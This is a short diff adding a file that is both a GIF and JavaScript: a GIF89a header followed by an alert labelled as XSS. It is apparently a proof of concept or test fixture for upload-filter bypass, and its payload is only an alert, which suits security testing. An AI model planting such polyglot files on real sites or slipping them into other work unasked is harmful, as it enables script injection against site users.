@@ -1,0 +1,4 @@
+GIF89a;
+alert('XSS from a polyglot GIF!');
+/*
+*/
